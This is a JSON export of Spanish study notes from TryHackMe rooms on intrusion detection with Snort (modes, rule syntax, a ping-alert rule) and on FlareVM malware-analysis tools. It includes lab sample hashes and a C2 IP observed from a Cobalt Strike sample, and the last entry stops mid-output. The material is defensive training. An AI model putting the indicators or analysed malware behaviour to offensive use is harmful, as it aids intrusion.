    "content": "Snort es uno de los IDSs de c√≥digo abierto m√°s usados, desarrollado en 1998. Usa un sistema h√≠brido de IDS. Trae pre-instalados varios archivos de configuraci√≥n de reglas. Estos son una variedad de patrones de ataque conocidos. Adem√°s, puedes configurar tus propias reglas. Tambi√©n puedes deshabilitar cualquier regla predefinida.\n\n-----------------------------\n<h2>Modos de Snort</h2>\n![[Pasted image 20251024214032.png]]\n\n| Modo                                    | Descripci√≥n                                                                                                                                                                                                                           |\n| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Packet sniffer mode                     | Este modo lee y muestra los paquetes de red sin realizar ning√∫n an√°lisis en ellos. El modo de esnifeo de paquetes puede ser √∫til cuando los analistas necesitan leer los paquetes de tr√°fico sin realizar ninguna acci√≥n sobre ellos. |\n| Packet logging mode                     | A veces es necesario guardar el tr√°fico de red para su posterior an√°lisis. Este modo te permite guardar el tr√°fico como un archivo PCAP. Los investigadores forenses investigan los logs.                                             |\n| Network Intrusion Detection System mode | Es su modo principal que monitoriza el tr√°fico de red en tiempo real y aplica sus archivos de reglas para identificar cualquier coincidencia.                                                                                         |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Snort Usage",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/4-snort-usage/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/4. Snort Usage.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Durante la instalaci√≥n de Snort, debes dar tu interfaz de red y rango. Puedes usarlo para capturar tr√°fico s√≥lamente, pero si quieres usar Snort para capturar y detectar intrusiones en toda tu red, debes activar el modo promiscuo en la interfaz de red de tu host.\n\nSnort tiene pre-instaladas algunos archivos de reglas, un archivo de configuraci√≥n y otros archivos. Estos son guardados en `/etc/snort`. El archivo clave para Snort es el archivo de configuraci√≥n `snort.conf`. Las reglas se guardan en el fichero `rules`. Si usamos `ls` para listar todos los archivos y ficheros en el directorio de Snort:\n\n```shell\nubuntu@tryhackme:~$ ls /etc/snort\nclassification.config  reference.config  snort.debian.conf\ncommunity-sid-msg.map  rules             threshold.conf\ngen-msg.map            snort.conf        unicode.map\n```\n\n-----------------------------\n<h2>Formato de las Reglas</h2>\nVeamos ahora c√≥mo se crean las reglas en Snort. Hay una manera muy espec√≠fica de escribir reglas. Esta es una regla de ejemplo que detecta paquetes ICMP viniente de cualquier direcci√≥n y puerto y alcanzando la red local en cualquier puerto. Una vez se detecta ese tr√°fico se lanza una alerta de \"Ping Detected\".\n\n![[Pasted image 20251025114149.png]]\n\n- **Action:** Especifica qu√© acci√≥n tomar cuando la regla se dispara.\n- **Protocol:** Se refiere al protocolo que coincide con la regla.\n- **Source IP:** Determina la IP de la que proviene el tr√°fico.\n- **Source Port:** Determina el puerto desde el que sale el tr√°fico.\n- **Destination IP:** Especifica la direcci√≥n IP de destino. En este ejemplo hemos usado `$HOME_NET` que es una variable que hemos definido en el archivo de configuraci√≥n de Snort.\n- **Destination Port:** Determina el puerto de destino.\n- **Rule metadata:** Cada regla tiene ciertos metadatos que se definen al final de la regla entre par√©ntesis. Sus componentes son:\n\t- **Message (msg):** Describe el mensaje mostrado cuando la regla se dispara.\n\t- **Signature ID (sid):** Cada regla tiene un identificador √∫nico. Lo configuramos nosotros, por lo que debemos llevar un recuento.\n\t- **Rule revision (rev):** Configura el n√∫mero de revisi√≥n de la regla. Cada vez que la regla sea modificada, el n√∫mero de revisi√≥n incrementa, lo que ayuda a llevar un control de cu√°ndo se cambia.\n\n------------------------------\n<h2>Creaci√≥n de Reglas</h2>\nCopiaremos la regla anterior (`alert icmp any any -> 127.0.0.1 any (msg:\"Loopback Ping Detected\"; sid:10003; rev:1;)`) en el archivo `/etc/snort/rules/local.rules`.\n\n----------------------------\n<h2>Comprobaci√≥n de Reglas</h2>\nPrimero, arrancaremos la herramienta Snort para detectar cualquier intrusi√≥n. Para esto tenemos que ejecutar el siguiente comando:\n\n`ubuntu@tryhackme:~$ sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf`\n\n>[!CAUTION] Reemplaza `lo` por el nombre que tenga tu interfaz de `loopback`.\n\nComo esta regla est√° dise√±ada para evitar los pings en nuestra interfaz loopback, trataremos de hacernos ping en `127.0.0.1`.\n\n```shell\nubuntu@tryhackme:~$ ping 127.0.0.1\n```\n\nLo de abajo muestra la alerta de \"Loopback Ping Detected\" cuando pingueamos nuestra interfaz loopback. Esto significa que nuestra regla est√° funcionando como debe.\n\n```shell\nubuntu@tryhackme:~$ sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf\n07/24-10:46:52.401504  [**] [1:1000001:1] Loopback Ping Detected [**] [Priority: 0] {ICMP} 127.0.0.1 -> 127.0.0.1\n07/24-10:46:53.406552  [**] [1:1000001:1] Loopback Ping Detected [**] [Priority: 0] {ICMP} 127.0.0.1 -> 127.0.0.1\n07/24-10:46:54.410544  [**] [1:1000001:1] Loopback Ping Detected [**] [Priority: 0] {ICMP} 127.0.0.1 -> 127.0.0.1\n```\n\n---------------------------------\n<h2>Corriendo Snort en Archivos PCAP</h2>\nA veces necesitaremos investigar un archivo de registro de tr√°fico de red. Para realizar este tipo de escaneo con Snort, podemos usar:\n\n```shell\nubuntu@tryhackme:~$ sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Types of IDS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/2-types-of-ids/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/2. Types of IDS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Los IDSs se pueden categorizar diferentemente dependiendo de ciertos factores. Su categorizaci√≥n principal depende de su modo de detecci√≥n y su despliegue.\n\n-----------------------\n<h2>Modos de Despliegue</h2>\nUn IDS puede ser desplegado de las siguientes maneras:\n\n- **Host Intrusion Detection System (HIDS):** Se instalan individualmente en los hosts y son responsables de detectar amenazas de seguridad potenciales asociadas a un host particular. Ofrecen visibilidad detallada de las actividades del host. Sin embargo pueden ser complicados de manejar en redes grandes.\n- **Network Intrusion Detection System (NIDS):** Son esenciales en detectar actividad maliciosa en la red entera sin importar un host en espec√≠fico. Monitorizan el tr√°fico de red de todos los hosts involucrados para detectar actividad maliciosa. Ofrece una vista centralizada de todas las detecciones dentro de la red.\n\n![[Pasted image 20251024210018.png]]\n\n--------------------------------\n<h2>Modos de Detecci√≥n</h2>\n- **Signature-based IDS:** Cada ataque tiene un patr√≥n √∫nico, que se conoce como firma. Estas son preservadas por los IDSs en sus bases de datos para que si el mismo ataque vuelve a ocurrir, se detecte y se frene a tiempo. Cuanto m√°s extensa sea la base de datos del IDS, m√°s fuerte es este m√©todo. No puede detectar ataque Zero-Day (que son los ataques que no tienen firmas previas).\n- **Anomaly-based IDS:** Este tipo de IDS primero aprende el comportamiento normal (baseline) de la red o sistema y realiza detecciones si hay alguna desviaci√≥n del comportamiento normal. Los IDSs basados en anomal√≠as tambi√©n pueden detectar ataques Zero-Day porque no dependen de firmas. Sin embargo, este tipo de IDS puede generar un alto n√∫mero de falsos positivos. \n- **Hybrid IDS:** Un IDS h√≠brido combina la detecci√≥n mediante firmas y la basada en anomal√≠as. Si la amenaza ya es conocida usar√° el sistema basado en firmas mientras que si no lo es, pivotar√° al basado en anomal√≠as.\n\nLos IDSs basados en firmas pueden detectar amenazas r√°pidamente. Sin embargo, para redes m√°s grandes, los basados en anomal√≠as o los h√≠bridos pueden detectar ataques modernos con exploits zeroday.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is an IDS",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/1-what-is-an-ids/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/1. What is an IDS.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "Como ya sabemos, los firewalls son la soluci√≥n de seguridad m√°s com√∫nmente desplegada en la frontera de una red para proteger el tr√°fico entrante y saliente. Sien embargo, tambi√©n deber√≠a haber seguridad dentro de la red, para detectar la actividad posiblemente maliciosa de aquellos atacantes que hayan conseguido sobrepasar el firewall. Es para este prop√≥sito que usamos los **IDS** (Intrusion Detection System).\n\nPiensa en el ejemplo del edificio otra vez. El firewall es el guardia de la puerta mientras que el IDS juega el rol de las c√°maras de seguridad internas. El IDS no realiza ninguna operaci√≥n con esas detecciones, s√≥lo informa a los administradores de seguridad.\n\n-------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Tipos de IDS y sus capabilidades de detecci√≥n.\n- Funcionamiento del IDS Snort.\n- Reglas personalizadas y por defecto de Snort.\n- Hacer reglas personalizadas para Snort.\n\n---------------------------\n<h2>Pre-requisitos</h2>\n[[0. Firewall Fundamentals]]\n[[0. Networking Concepts]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Practical Lab",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/5-practical-lab/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/5. Practical Lab.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "1. Vamos a donde nos dicen que est√° el archivo `.pcap`:\n   ![[Pasted image 20251025153857.png]]\n2. Usamos Snort para cargar el pcap:\n   ![[Pasted image 20251025154122.png]]\n3. Detectamos la IP de la m√°quina que accedi√≥ por SSH:\n   ![[Pasted image 20251025154246.png]]\n4. Buscamos la otra regla cumplida en el pcap:\n   ![[Pasted image 20251025154328.png]]\n5. Buscamos el SID de la regla que se dispara con la conexi√≥n SSH:\n   ![[Pasted image 20251025154430.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. IDS Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/3-ids-fundamentals/0-ids-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/3. IDS Fundamentals/0. IDS Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions > 3. IDS Fundamentals",
    "content": "[[1. What is an IDS]]\n[[2. Types of IDS]]\n[[3. IDS Example - Snort]]\n[[4. Snort Usage]]\n[[5. Practical Lab]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Analyzing Malicious Files!",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/4-analyzing-malicious-files/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/4. Analyzing Malicious Files!.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "En esta tarea nos mancharemos las manos. Vamos a ello.\n\nUsando las herramientas de nuestra m√°quina FLARE, analizaremos diferentes ejecutables, los ejecutaremos y veremos qu√© hacen en una m√°quina.\n\nUn archivo malicioso **windows.exe** fue descargado por un usuario el 24/09/2024 a las 3:43 PM. Esta descarga fue etiquetada como una amenaza potencial. El equipo de monitorizaci√≥n te ha enviado un email pidi√©ndote realizar un an√°lisis de √©l. Te han mandado el archivo que ahora est√° en: `C:\\Users\\Administrator\\Desktop\\Sample`.\n\n![[Pasted image 20251030121219.png]]\n\nEn nuestro acercamiento inicial a la investigaci√≥n, realizaremos un an√°lisis est√°tico para obtener informaci√≥n inicial del binario.\n\n-----------------------------\n<h2>An√°lisis usando PEStudio</h2>\nEmpecemos con PEStudio. Abre el archivo con esta herramienta, ¬øQu√© informaci√≥n podemos usar aqu√≠?\n\n![[Pasted image 20251030122444.png]]\n\nPara los hashes generados en MD5 `9FDD4767DE5AEC8E577C1916ECC3E1D6` y SHA-1 `A1BC55A7931BFCD24651357829C460FD3DC4828F`, se recomienda compararlos en bases de datos como [VirusTotal](https://www.virustotal.com/gui/). Si no hay coincidencias es probable de que se trate de una nueva campa√±a de malware.\n\nAunque el archivo dice estar conectado al Editor de Registros de Windows (REGEDIT), que podemos ver basada en la descripci√≥n, es probablemente un truco para jug√°rsela a la gente y evadir la detecci√≥n.\n\nHerramientas leg√≠timas de REGEDIT se suelen encontrar en `C:\\Windows\\System32` m√°s que en la carpeta de descargas.\n\n¬øQu√© m√°s?\n\n![[Pasted image 20251030123024.png]]\n\n–†–µ–¥–∞–∫—Ç–æ—Ä —Ä–µ–µ—Å—Ç—Ä–∞\" - \"Registry Editor\", \"–û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ Microsoft¬Æ Windows¬Æ\"), en los metadatos del archivo es bastante sospechoso. M√°s que nada porque ni el usuario ni la organizaci√≥n opera en un entorno de habla rusa.\n\nLa ausencia de un **rich header** indica que el archivo es potencialmente empaquetado u ofuscado para evitar detecci√≥n en herramientas de an√°lisis est√°tico. Este es un comportamiento t√≠pico de malware sofisticado que intenta evadir la detecci√≥n alterando secciones cr√≠ticas del archivo PE.\n\nLa pesta√±a funciones lista las llamadas a APIs que el archivo ha importado. Esto tambi√©n se conoce como IAT (Import Address Table). Haciendo click en la pesta√±a de lista negra, PEStudio reorganizar√° la pesta√±a moviendo todas aquellas en la lista negra arriba.\n\n![[Pasted image 20251030123525.png]]\n\nAqu√≠ algunas funciones importantes que vimos:\n\n- `set_UseShellExecute`: Esta funci√≥n permite al proceso usar la shell del sistema operativo para ejecutar otros procesos. Se suele ver en malware que crea nuevos procesos para llevar a cabo las acciones maliciosas.\n- `CryptoStream, RijndaelManage, CipherMode, CreateDecryptor`: Estas APIs indican que los ejecutables usan funciones criptogr√°ficas, especialmente Rijndael (encriptaci√≥n AES). El malware puede usar encriptaci√≥n criptogr√°fica para comunicaciones y archivos o incluso para implementar funcionalidades del malware.\n\n-------------------------------\n<h2>An√°lisis usando FLOSS</h2>\nAbre PowerShell y ve al directorio donde est√° nuestro archivo, que es `C:\\Users\\Administrator\\Desktop\\Sample`. Ejecuta el comando `FLOSS.exe .\\windows.exe > windows.txt`. Esto ejecutar√° la herramienta FLOSS y guardar√° el resultado de la ejecuci√≥n en `windows.txt`.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\Sample > FLOSS.exe .\\windows.exe > windows.txt\nWARNING: floss: .NET language-specific string extraction is not supported yet\nWARNING: floss: FLOSS does NOT attempt to deobfuscate any strings from .NET binaries\nINFO: floss: disabled string deobfuscation\nINFO: floss: extracting static strings\nINFO: floss: finished execution after 0.34 seconds\nINFO: floss: rendering results\n```\n\nAbre el archivo y ve a la parte de abajo del resultado:\n\n![[Pasted image 20251030124700.png]]\n\n¬øTe resultan familiares? Son las funciones que vimos antes usando la herramienta PEStudio.\n\n------------------------------\n<h2>An√°lisis con Process Explorer y Process Monitor</h2>\nEn este ejemplo, analizaremos la conexi√≥n de red del archivo **cobaltstrike.exe** localizado en `C:\\Users\\Administrator\\Desktop\\Sample`.\n\nTrataremos de saber si el archivo est√° realizando alguna conexi√≥n de red a alg√∫n posible servidor C2. Ejecuta el archivo **cobaltstrike.exe** y abre **Process Explorer** en el escritorio o desde la barra de tareas.\n\n![[Pasted image 20251030125121.png]]\n\nEl ID del proceso (PID) es 4756. Date cuenta de que el PID puede ser diferente en tu m√°quina. Haz click en el proceso, selecciona **Propiedades** y ve a la pesta√±a **TCP/IP**. Deber√≠amos ser capaces de determinar el destino al que se conecta y el estado que manda.\n\n![[Pasted image 20251030125248.png]]\n\nAh√≠ lo tenemos. En otra nota, cuando hacemos el an√°lisis debemos verificarlo con precisi√≥n. As√≠ no dependeremos s√≥lo de una herramienta. Para el proceso y vuelve a ejecutarlo. Esta vez usaremos **Procmon**.\n\nCuando abrimos procmon, buscar el binario es un reto ya que este lista todos los pocesos activos. Lo que vamos a hacer es filtrarlo. Puedes darle al icono de abajo o hacer **CRTL + L**.\n\n![[Pasted image 20251030125458.png]]\n\nUsar este filtro involucra varios pasos:\n\n1. Seleccionar **Process Name**.\n2. Seleccionar **Contains**.\n3. Escribir cualquier palabra relacionada con el proceso. En este caso **cobalt**.\n4. Click en **include**.\n5. Click en **Add** y luego en **Apply**.\n6. Deber√≠amos ver las condiciones a√±adidas.\n   ![[Pasted image 20251030125703.png]]\n\nEsto deber√≠a darnos un resultado m√°s detallado.\n\n![[Pasted image 20251030125734.png]]\n\nEsto nos confirma que el binario estaba en efecto realizando una conexi√≥n a una IP desconocida que es `47.120.46.210`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Arsenal of Tools",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/2-arsenal-of-tools/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/2. Arsenal of Tools.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "En esta tarea te introduciremos a las herramientas en FlareVM. Tiene m√∫ltiples herramientas de for√©nsica, respuesta a incidentes e investigaci√≥n de malware.\n\nTe mostramos las herramientas agrupadas por categor√≠a.\n\n-------------------------------\n<h2>Ingenier√≠a Inversa y Depuraci√≥n</h2>\nLa ingenier√≠a inversa es como resolver un puzzle al rev√©s. Tomas un producto terminado y lo separas en piezas para entenderlo. Depurar es identificar errores, entender por qu√© pasan y corregirlos para prevenirlos.\n\n- **Ghidra:** Desarrollada por la NSA, suite de ingenier√≠a inversa de c√≥digo abierto.\n- **x64dbg:** Depurador de c√≥digo abierto para binario en formatos x32 y x64.\n- **OllyDbg:** Depurador para ingenier√≠a inversa a nivel de ensamblador.\n- **Radare2:** Una plataforma sofisticada de c√≥digo abierto para ingenier√≠a inversa.\n- **Binary Ninja:** Herramienta para desensamblar y descompilar archivos.\n- **PEiD:** Herramienta de empaquetado, criptograf√≠a y compilado.\n\n-----------------------------------\n<h2>Desensambladores y Descompiladores</h2>\nLos desensambladores y descompiladores son herramientas clave en el an√°lisis de malware. Ayudan a los analistas a entender los comportamientos, la l√≥gica y el control de flujo del software malicioso separ√°ndolo en partes m√°s entendibles.\n\n- **CFF Explorer:** Editor para analizar y editar archivos Portable Executable (PE).\n- **Hopper Disassembler:** Depurador, desensamblador y descompilador.\n- **RetDec:** Descompilador de c√≥digo abierto para c√≥digo m√°quina.\n\n----------------------------------\n<h2>An√°lisis Est√°tico y Din√°mico</h2>\nAn√°lisis est√°tico y din√°mico son dos m√©todos cruciales en ciberseguridad para examinar malware. El an√°lisis est√°tico incluye inspeccionar el c√≥digo sin ejecutarlo, mientras que el an√°lisis din√°mico consiste en ejecutarlo y ver c√≥mo se comporta.\n\n- **Process Hacker:** Editor de memoria y visor de procesos sofisticado.\n- **PEview:**  Visor de archivos PE para an√°lisis.\n- **Dependency Walker:** Herramienta para mostrar las dependencias DLL de un ejecutable.\n- **DIE (Detect It Easy):** Un empaquetador, compilador y detector de criptominer√≠a.\n\n---------------------------\n<h2>For√©nsica y Respuesta a Incidentes</h2>\nLa for√©nsica digital incluye la recolecci√≥n, an√°lisis y preservaci√≥n de evidencia digital de varias fuentes como ordenadores, redes y dispositivos de almacenamiento. La respuesta a incidentes se centra en la detecci√≥n, contenci√≥n, erradicaci√≥n y recuperaci√≥n de ciberataques.\n\n- **Volatility:** Framework de an√°lisis de memoria RAM para forense.\n- **Rekall:** Framework para memoria forense en respuesta a incidentes.\n- **FTK Imager:** Adquisici√≥n de im√°genes de disco y herramientas de an√°lisis de uso forense.\n\n---------------------------\n<h2>An√°lisis de Red</h2>\nEl an√°lisis de red incluye diferentes m√©todos y t√©cnicas para estudiar y analizar redes para descubrir patrones, optimizar el rendimiento y entender la estructura y comportamiento de la red.\n\n- **Wireshark:** Analizador de paquetes y protocolos de red para grabar y analizar tr√°fico.\n- **Nmap:** Herramienta de mapeo y detecci√≥n de vulnerabilidades.\n- **Netcat:** Escribe y lee informaci√≥n a lo largo de las conexiones de red con esta herramienta.\n\n------------------------------\n<h2>An√°lisis de Archivos</h2>\nEl an√°lisis de archivos es una t√©cnica usada para examinar archivos en busca de amenazas potenciales para la seguridad y asegurar los permisos correctos.\n\n- **FileInsight:** Programa para mirar a trav√©s y editar binarios.\n- **Hex Fiend:** Editor hexadecimal r√°pido y ligero.\n- **HxD:** Visor y editor de archivos binarios con editor hexadecimal.\n\n------------------------\n<h2>Scripting y Automatizaci√≥n</h2>\nInvolucra usar scripts como de PowerShell y Python para automatizar tareas y procesos repetitivos., haci√©ndolos m√°s eficientes y menos susceptibles de error humano.\n\n- **Python:** Lenguaje de scripting enfocado en la automatizaci√≥n con m√≥dulos y herramientas.\n- **PowerShell Empire:** Framework para la post-explotaci√≥n PowerShell.\n\n--------------------------------\n<h2>Suite Sysinternals</h2>\nLa Suite Sysinternals es una colecci√≥n de utilidades de sistema avanzadas dise√±ada para ayudar a los profesionales de IT y desarrolladores a dirigir, resolver problemas y diagnosticar los sistemas Windows.\n\n- **Autoruns:** Muestra lo que lo ejecutables est√°n configurados para hacer durante el arranque del sistema.\n- **Process Explorer:** Ofrece informaci√≥n sobre procesos corriendo.\n- **Process Monitor:** Monitoriza y registra procesos y actividades de hilos en tiempo real.\n\nTranquilo que no vamos a ver todas las herramientas, s√≥lo queremos que veas c√≥mo es tener una caja con herramientas que pueden hacer tantas cosas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Commonly Used Tools for Investigation - Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/4-flarevm-arsenal-of-tools/3-commonly-used-tools-for-investigation-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/4. FlareVM - Arsenal of Tools/3. Commonly Used Tools for Investigation - Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 4. FlareVM - Arsenal of Tools",
    "content": "Examinemos las herramientas en las que nos enfocaremos en esta unidad.Estas son las b√°sicas usadas en investigaciones iniciales:\n\n| **Herramienta**  | **Valor Investigativo**                                                                                                                   |\n| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |\n| Procmon          | Una herramienta √∫til para rastrear la actividad del sistema, especialmente en lo concerniente al malware.                                 |\n| Process Explorer | Te permite ver el proceso de la relaci√≥n padre-hijo, DLLs cargados y su ruta.                                                             |\n| HxD              | Los archivos maliciosos pueden ser examinados o alterados v√≠a ecidi√≥n hexadecimal.                                                        |\n| Wireshark        | Observar e invesstigar el tr√°fico de red buscando actividad inusual.                                                                      |\n| CFF Explorer     | Puede generar hashes de archivos para verificaci√≥n de integridad, autentificar la fuente de los archivos de sistema y validar su validez. |\n| PEStudio         | An√°lisis est√°tico o estudiarpropiedades de un archivo ejecutable sin ejecutarlo.                                                          |\n| FLOSS            | Extrae y desofusca todas las strings de un programa de malware usando t√©cnicas avanzadas de an√°lisis est√°tico.                            |\n\n------------------------------------\n<h2>Process Monitor (Procmon)</h2>\nUna poderosa herramienta dise√±ada para ayudarte a grabar problemas con las apps de tu sistema. Te deja ver, grabar y llevar control del sistema y la actividad de archivos de Windows en tiempo real. Es √∫til en cuanto a rastrear la actividad del sistema, especialmente en lo relacionado a la investigaci√≥n de malware, resoluci√≥n de problemas e investigaciones forenses.\n\nAs√≠ se utiliza de manera eficiente para la investigaci√≥n:\n\n![[Pasted image 20251030102159.png]]\n\nDe acuerdo con esta entrada de logs, el Servicio del Autoridad de Seguridad Local del Subsistema (LSASS), con proceso lsass.exe ha le√≠do un archivo exitosamente. LSASS maneja autentificaci√≥n y se comunica frecuentemente con los archivos cruciales del sistema como lsasrv.dll (Local Security Authority Server Service).\n\nAunque es un archivo est√°ndar del sistema, LSASS puede ser objetivo de dumpeo de credenciales. Mimikatz y otras herramientas suelen intentar acceder a la memoria de LSASS. Deber√≠as fijarte en actividad adicional.\n\n------------------------\n<h2>Process Explorer (Procexp)</h2>\nOfrece vistas profundas de los procesos activos corriendo en tu ordenador. Te permite ahondar en los trabajos internos de tu sistema, ofreciendo una lista de los procesos activos y sus cuentas de usuario relacionadas. Si alguna vez has sentido curiosidad sobre qu√© programa est√° accediendo a un archivo o directorio espec√≠fico, Process Explorer nos ofrece esa informaci√≥n.\n\n![[Pasted image 20251030104256.png]]\n\nComo puedes ver por la imagen de arriba, CFF Explorer est√° abierto. Usando **Process Explorer (procexp)**, localizado en el escritorio, podemos identificar el proceso y su padre. Esto es √∫til cuando queremos monitorizar qu√© otros procesos est√°n siendo creados como documentos Word, LNK (archivos link, o redirecciones) o ISO, ya que los actores maliciosos suelen abusarlos.\n\n---------------------------------\n<h2>HxD</h2>\nEs un editor hexadecimal r√°pido y ligero que sirvepara editar archivos, memoria y drives de cualquier capacidad. Puede ser aplicado a la investigaci√≥n forense, recuperaci√≥n de informaci√≥n, depuraci√≥n y manipulaci√≥n exacta de informaci√≥n binaria. Algunas funcionalidades importantes son la vista del archivo y sus contenidos de memoria, edici√≥n, b√∫squeda y comparaci√≥n de informaci√≥n hexadecimal. Veamos c√≥mo funciona la herramienta.\n\n![[Pasted image 20251030110216.png]]\n\nEsta captura del editor hexadecimal HxD muestra el archivo binario **posible_medusa.txt**. La informaci√≥n hexadecimal en la izquierda indica el contenido del archivo en hexadecimal y la interpretaci√≥n ASCII aparece a la derecha. Interesantemente, el archivo empieza con **4D 5A (Little Endian)**, indicando que es ejecutable.\n\nEl inspector de informaci√≥n, a la derecha, nos permite examinar bytes individuales mostrando sus valores en varios tipos de informaci√≥n (int, float, etc.), facilitando la evalucaci√≥n de dicha informaci√≥n.\n\n--------------------------------\n<h2>CFF Explorer</h2>\nCon la ayuda de la informaci√≥n de archivo que brinda CFF Explorer, los investigadores pueden generar hashes de archivos para verificar su integridad, autentificar la fuente del sistema de archivos y validar su validez. Esto es importante saberlo al analizar malware ya que el c√≥digo malicioso puede esconderse en archivos de sistema alterados.\n\n![[Pasted image 20251030111047.png]]\n\nLos detalles del archivo **cryptominer.bin** se muestran en el ejemplo. El 23 de Septiembre de 2024, se gener√≥ un archivo PE de 64 bits. La informaci√≥n del archivo puede ser verificada con hashes (SHA-1 y MD5), Durante las investigaciones, esta herramienta ayuda en la confirmaci√≥n de la informaci√≥n del archivo y localizando posible problemas.\n\n--------------------------------\n<h2>Wireshark</h2>\nConcerniente al an√°lisis de tr√°fico de red, Wireshark es una herramienta poderosa que los investigadores pueden usar para cazar conexiones sospechosas, examinar protocolos y encontrar posibles asaltos o exfiltraci√≥n de informaci√≥n. En este caso TLSv1.2 sugiere una conexi√≥n segura y encriptada que puede enmascarar actividad da√±ina.\n\n![[Pasted image 20251030111613.png]]\n\nMuestra paquetes capturados con detalles sobre protocolo, fuente, destinaci√≥n y otra informaci√≥n. La mayor√≠a de los paquetes muestran que TLSv1.2 y TCP se usan para transmisiones encriptadas. La informaci√≥n raw de los paquetes se muestra en ASCII y hexadecimal, con un bloque significativo encriptado usando TLSv1.2.\n\n---------------------------------\n<h2>PEStudio</h2>\nAn√°lisis est√°tico, o estudiar propiedades de archivos ejecutables sin correr los archivos se hace con PEStudio. Esta funcionalidad es beneficiosa en varias situaciones. PEStudio ofrece una variedad de informaci√≥n sobre el archivo sin poner a los usuarios en peligro. PEStudio ofrece una variedad de informaci√≥n sobre un archivo sin poner a los usuarios en riesgo por la ejecuci√≥n, lo que ayuda en identificar ejecutables que parecen o son sospechosos de ser da√±inos.\n\n![[Pasted image 20251030112822.png]]\n\nEste ejemplo muestra la examinaci√≥n de un archivo ejecutable, como PSexec.exe, usando PEStudio 9.22, una herramienta de an√°lisis est√°tico. Este archivo tiene un prop√≥sito doble, leg√≠timo por administradores de sistema pero potencialmente explotado por hackers buscando acceso remoto.\n\nLa entrop√≠a del archivo de **6.596** sugiere la posibilidad remota de empaquetado o encriptaci√≥n, que es t√≠pico de software peligroso.La versi√≥n **2.34** de esta consola basada en 32 bits, permite que el programa se ejecute remotamente, una funcionalidad frecuentemente usada para migrar lateralmente durante los ataques. El archivo se ensambla usando Visual C++ 8.\n\n--------------------------------\n<h2>FLOSS</h2>\nUsando t√©cnicas avanzadas de an√°lisis est√°tico, el Solucionador de Strings Ofuscadas de FLARE (FLOSS) extrae utom√°ticamente y desofusca todas las strings de los programas de malware. Como strings.exe, puede mejorar el an√°lisis est√°tico b√°sico de binarios desconocidos. FLOSS tambi√©n incluye m√°s scripts de Python en el directorio de scripts, lo que puede ser usado para cargar el output del script en otros programas.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\Sample > floss .\\cobaltstrike.exe\nINFO: floss: extracting static strings\nfinding decoding function features: 